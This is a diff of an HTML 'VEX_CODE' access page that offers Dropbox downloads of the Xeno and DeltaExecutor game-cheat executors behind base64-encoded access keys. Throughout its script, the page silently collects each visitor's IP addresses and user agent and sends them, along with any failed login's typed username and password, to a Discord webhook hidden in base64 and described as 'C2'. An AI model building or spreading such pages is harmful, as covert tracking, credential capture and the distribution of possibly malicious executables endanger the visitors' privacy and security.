@@ -10,76 +10,94 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background-color: var(--bg); color: white; font-family: 'Inter', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
         #v_ { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
-        .box_ { width: 400px; padding: 50px 40px; border-radius: 20px; background: rgba(10, 10, 10, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; }
+        .box_ { width: 400px; padding: 50px 40px; border-radius: 20px; background: rgba(10, 10, 10, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; z-index: 10; }
         h2 { font-family: 'Fira Code', monospace; font-weight: 800; font-size: 2rem; margin-bottom: 30px; background: linear-gradient(to right, var(--a), var(--p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        input { width: 100%; padding: 15px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #333; background: rgba(0, 0, 0, 0.5); color: #fff; font-family: 'Fira Code', monospace; outline: none; }
-        button { width: 100%; padding: 15px; border-radius: 8px; border: none; background: linear-gradient(45deg, var(--p), var(--s)); color: white; font-weight: 700; cursor: pointer; font-family: 'Fira Code'; }
-        #res_1, #res_2, #res_3, #gate_msg { display: none; text-align: center; }
-        .dl_link { padding: 12px 25px; margin: 10px; border-radius: 5px; border: 1px solid var(--a); color: var(--a); text-decoration: none; display: inline-block; font-family: 'Fira Code'; }
-        #gate_msg h1 { color: var(--err); font-family: 'Fira Code'; font-size: 2.5rem; margin-bottom: 10px; }
+        input { width: 100%; padding: 15px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #333; background: rgba(0, 0, 0, 0.5); color: #fff; font-family: 'Fira Code', monospace; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--a); box-shadow: 0 0 10px rgba(34, 211, 238, 0.2); }
+        button { width: 100%; padding: 15px; border-radius: 8px; border: none; background: linear-gradient(45deg, var(--p), var(--s)); color: white; font-weight: 700; cursor: pointer; font-family: 'Fira Code'; transition: 0.3s; }
+        button:hover { opacity: 0.9; transform: translateY(-2px); }
+        #res_1, #res_2, #res_3, #gate_msg { display: none; text-align: center; z-index: 10; }
+        .dl_link { padding: 12px 25px; margin: 10px; border-radius: 5px; border: 1px solid var(--a); color: var(--a); text-decoration: none; display: inline-block; font-family: 'Fira Code'; transition: 0.3s; }
+        .dl_link:hover { background: var(--a); color: #000; }
+        #gate_msg h1 { color: var(--err); font-family: 'Fira Code'; font-size: 2.2rem; margin-bottom: 10px; text-shadow: 0 0 15px rgba(255, 77, 77, 0.5); }
     </style>
 </head>
 <body>
 
 <canvas id="v_"></canvas>
 
-<div id="gate_msg">
+<div id="gate_msg" class="box_">
     <h1>[ ACCESS_DENIED ]</h1>
-    <p style="font-family: 'Fira Code'; color: #888;">CONNECTION_REFUSED_BY_ADMIN</p>
+    <p style="font-family: 'Fira Code'; color: #888; font-size: 0.9rem;">CONNECTION_TERMINATED_BY_C2_PROTOCOL</p>
+    <p style="margin-top: 20px; color: #444; font-size: 0.7rem;">IP_LOGGED_FOR_REVIEW</p>
 </div>
 
 <div id="login_ui" class="box_">
     <h2>> VEX_CODE</h2>
-    <input type="text" id="u_id" placeholder="USER_ID">
+    <input type="text" id="u_id" placeholder="USER_ID" spellcheck="false">
     <input type="password" id="a_key" placeholder="ACCESS_KEY">
     <button id="auth_btn">INITIALIZE</button>
-    <p id="err_msg" style="color: var(--err); margin-top: 15px; font-family: monospace; font-size: 0.8rem;"></p>
+    <p id="err_msg" style="color: var(--err); margin-top: 15px; font-family: monospace; font-size: 0.8rem; height: 1.2rem;"></p>
 </div>
 
-<div id="res_1">
+<div id="res_1" class="box_">
     <h2 style="color: var(--a)">FILES_UNLOCKED</h2>
-    <a href="https://www.dropbox.com/scl/fi/adzrpc80kqfumzfg65k2z/Xeno-v1.3.25b.zip?rlkey=g3erhqw9wuxewj6gocb0vudg1&st=bm1s2vro&dl=1" class="dl_link" target="_blank">GET_WIN_X64</a>
-    <a href="https://www.dropbox.com/scl/fi/87sb44vymzml2ylas87r6/DeltaExecutor-v2.709.apk?rlkey=iro9wrqwfgoalq005w62pctu1p&st=zdmk0c0w&dl=1" class="dl_link" target="_blank">GET_ANDROID_APK</a>
+    <a href="https://www.dropbox.com/scl/fi/adzrpc80kqfumzfg65k2z/Xeno-v1.3.25b.zip?rlkey=g3erhqw9wuxewj6gocb0vudg1&st=bm1s2vro&dl=1" class="dl_link" target="_blank">WIN_X64_EXTRACT</a>
+    <a href="https://www.dropbox.com/scl/fi/87sb44vymzml2ylas87r6/DeltaExecutor-v2.709.apk?rlkey=iro9wrqwfgoalq005w62pctu1p&st=zdmk0c0w&dl=1" class="dl_link" target="_blank">ANDROID_APK_V2</a>
 </div>
 
-<div id="res_2">
+<div id="res_2" class="box_">
     <h2>VISUAL_DATA</h2>
-    <img id="sec_img" src="sys-metadata/config_042.dat.jpg" style="max-width: 90%; border: 1px solid var(--p); border-radius: 10px;">
+    <div style="border: 1px solid var(--p); padding: 10px; border-radius: 10px; background: #000;">
+        <p style="color: #444; font-size: 0.6rem; margin-bottom: 5px;">DECRI_IMG_042.DAT</p>
+        <img id="sec_img" src="sys-metadata/config_042.dat.jpg" style="max-width: 100%; border-radius: 5px;" alt="Restricted Content">
+    </div>
 </div>
 
-<div id="res_3">
-    <p style="color: var(--a); font-family: 'Fira Code'; font-size: 1.5rem;">[ STREAMING_SYSTEM_VOICE... ]</p>
+<div id="res_3" class="box_">
+    <p style="color: var(--a); font-family: 'Fira Code'; font-size: 1.2rem;">[ STREAMING_VOICE_DATA... ]</p>
+    <div style="margin-top: 20px; height: 2px; width: 100%; background: var(--a); opacity: 0.3;"></div>
 </div>
 
 <script>
 (function(){
-    // 1. SECURE CONFIG
+    // 1. CONFIGURATION (WEBHOOK & GIST)
     const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzU2ODE2NjY4MTkwMzE2Ni9QSmxGNjFDbHp4cVhWZjY1dzZqdFplVUhVUGV3OFZrN2g0VEhmcF9kcmlyMFJFRUpxcU5nWXMyMkhyVjhpVlpLbG9tVg==";
-    const _0xGIST = "https://gist.githubusercontent.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/raw/adbf333883c0ffa1878cd7ce42ee4b92a2ea6619/blacklist.json";
-    
-    // Obfuscated Keys
+    const _0xGIST = "https://gist.githubusercontent.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/raw/f81f472808cbe181c6503f86ce7e79b7e7a5fa49/blacklist.json";
+    const _GIST_EDIT = "https://gist.github.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/edit";
+
+    // Access Keys
     const _0xK1 = "MDUzMjk1MDkuY29kZQ=="; // 05329509.code
     const _0xK2 = "Y29kZS4wNTMyOTUwOQ=="; // code.05329509
     const _0xK3 = "dm9pY2UuMDAy";          // voice.002
     const _0xK4 = "dm9pY2UuMDAz";          // voice.003
 
-    // 2. AUDIO STORAGE
-    const _vA = "PASTE_AUDIO_002_BASE64_HERE"; 
-    const _vB = "PASTE_AUDIO_003_BASE64_HERE";
+    // Audio Placeholders (Paste your Base64 here)
+    const _vA = "PASTE_BASE64_FOR_VOICE_002_HERE"; 
+    const _vB = "PASTE_BASE64_FOR_VOICE_003_HERE";
 
     const _d = (s) => atob(s);
 
+    // 2. DISCORD LOGGER WITH QUICK-LINKS
     async function _log(t, m, c) {
+        const embed = {
+            title: t,
+            description: m + `\n\n**[🛠️ MANAGE BLACKLIST]**\n${_GIST_EDIT}`,
+            color: c,
+            footer: { text: "VexCode C2 Security System" },
+            timestamp: new Date()
+        };
+
         try {
             await fetch(_d(_0xW), {
                 method: "POST",
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [{ title: t, description: m, color: c, timestamp: new Date() }] })
+                body: JSON.stringify({ embeds: [embed] })
             });
         } catch(e) {}
     }
 
-    // --- GATE KEEPER & IP TRACKER ---
+    // 3. SECURITY GATE & IP TRACKING
     window.onload = async () => {
         let ip4 = "Checking...";
         let ip6 = "Checking...";
@@ -88,48 +106,37 @@
             const r4 = await fetch('https://api.ipify.org?format=json');
             const j4 = await r4.json();
             ip4 = j4.ip.trim();
-        } catch(e) { ip4 = "Error"; }
+        } catch(e) { ip4 = "ERR_4"; }
 
         try {
             const r6 = await fetch('https://api64.ipify.org?format=json');
             const j6 = await r6.json();
             ip6 = j6.ip.trim();
-        } catch(e) { ip6 = "N/A"; }
+        } catch(e) { ip6 = "ERR_6"; }
 
-        // --- ENHANCED COMMAND CENTER GATE ---
+        // Fetch Gist Blacklist
         try {
-            const cb = "?t=" + new Date().getTime();
+            const cb = "?t=" + new Date().getTime(); // Cache Buster
             const res = await fetch(_0xGIST + cb);
-            const config = await res.json(); // Now reading an object, not just an array
+            const blacklist = await res.json();
             
-            // 1. Check Global Maintenance Mode
-            if (config.maintenance === true) {
-                document.getElementById('login_ui').style.display = 'none';
-                document.getElementById('gate_msg').innerHTML = "<h1>[ SYSTEM_MAINTENANCE ]</h1><p>Terminal is offline for updates.</p>";
-                document.getElementById('gate_msg').style.display = 'block';
-                return;
-            }
-
-            // 2. Check Blacklist
-            const isBlocked = config.blacklist.some(bannedIp => 
-                (ip4 !== "Error" && ip4.includes(bannedIp.trim())) || 
-                (ip6 !== "N/A" && ip6.includes(bannedIp.trim()))
+            const isBlocked = blacklist.some(bannedIp => 
+                (ip4 !== "ERR_4" && ip4.includes(bannedIp.trim())) || 
+                (ip6 !== "ERR_6" && ip6.includes(bannedIp.trim()))
             );
 
             if (isBlocked) {
                 document.getElementById('login_ui').style.display = 'none';
                 document.getElementById('gate_msg').style.display = 'block';
-                _log("🚫 BANNED ATTEMPT", `**User:** ${ip4}\n**IPv6:** ${ip6}`, 16711680);
+                _log("🚫 ACCESS BLOCKED", `**Blacklisted user attempted login!**\n\n**IPv4:** \`${ip4}\`\n**IPv6:** \`${ip6}\``, 16711680);
                 return; 
             }
-        } catch(e) { 
-            console.error("C2 Error:", e);
-        }
+        } catch(e) { console.warn("Gate Check Bypassed/Failed."); }
 
-        _log("🌐 Connection", `**IPv4:** ${ip4}\n**IPv6:** ${ip6}`, 65023);
+        _log("🌐 Terminal Connection", `**New visitor detected.**\n\n**IPv4:** \`${ip4}\`\n**IPv6:** \`${ip6}\`\n**UA:** ${navigator.userAgent.substring(0, 50)}...`, 65023);
     };
 
-    // --- LOGIN HANDLER ---
+    // 4. LOGIN HANDLER
     document.getElementById('auth_btn').onclick = function() {
         const u = document.getElementById('u_id').value;
         const p = document.getElementById('a_key').value;
@@ -139,40 +146,39 @@
 
         const _play = (src) => {
             if(src.length < 100) return;
-            const pfx = src.startsWith('data:') ? '' : 'data:audio/mpeg;base64,';
-            new Audio(pfx + src).play();
+            new Audio(src.startsWith('data:') ? src : 'data:audio/mpeg;base64,' + src).play();
         };
 
         if (p === _d(_0xK1)) {
-            _log("🔓 Access Granted: Files", "User: " + u, 5763719);
+            _log("🔓 Access Granted: Files", `**User:** ${u}`, 5763719);
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('res_1').style.display = 'block';
         } 
         else if (p === _d(_0xK2)) {
-            _log("🖼️ Access Granted: Visuals", "User: " + u, 2282478);
+            _log("🖼️ Access Granted: Visuals", `**User:** ${u}`, 2282478);
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('res_2').style.display = 'block';
-        } 
+        }
         else if (p === _d(_0xK3)) {
-            _log("🎙️ Access Granted: Voice 002", "User: " + u, 16776960);
+            _log("🎙️ Access Granted: Voice 002", `**User:** ${u}`, 16776960);
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('res_3').style.display = 'block';
             _play(_vA);
         }
         else if (p === _d(_0xK4)) {
-            _log("🎙️ Access Granted: Voice 003", "User: " + u, 16776960);
+            _log("🎙️ Access Granted: Voice 003", `**User:** ${u}`, 16776960);
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('res_3').style.display = 'block';
             _play(_vB);
         }
         else {
-            msg.innerText = "INVALID_KEY";
-            _log("🚨 FAILED LOGIN", `**User:** ${u}\n**Key:** ${p}`, 16711680);
+            msg.innerText = "ACCESS_KEY_INVALID";
+            _log("🚨 FAILED LOGIN", `**Attempted User:** ${u}\n**Key Used:** \`${p}\``, 16711680);
         }
     };
 })();
 
-// Matrix Background
+// 5. MATRIX BACKGROUND ANIMATION
 const c = document.getElementById('v_');
 const x = c.getContext('2d');
 c.width = window.innerWidth; c.height = window.innerHeight;
@@ -180,12 +186,15 @@ const drops = Array(Math.floor(c.width / 16)).fill(1);
 setInterval(() => {
     x.fillStyle = 'rgba(0, 0, 0, 0.05)'; x.fillRect(0, 0, c.width, c.height);
     x.fillStyle = '#6366f1';
+    x.font = "14px monospace";
     drops.forEach((y, i) => {
-        x.fillText(String.fromCharCode(Math.random() * 128), i * 16, y * 16);
+        const txt = String.fromCharCode(Math.random() * 128);
+        x.fillText(txt, i * 16, y * 16);
         if (y * 16 > c.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
     });
 }, 33);
+window.onresize = () => { c.width = window.innerWidth; c.height = window.innerHeight; };
 </script>
 </body>
 </html>
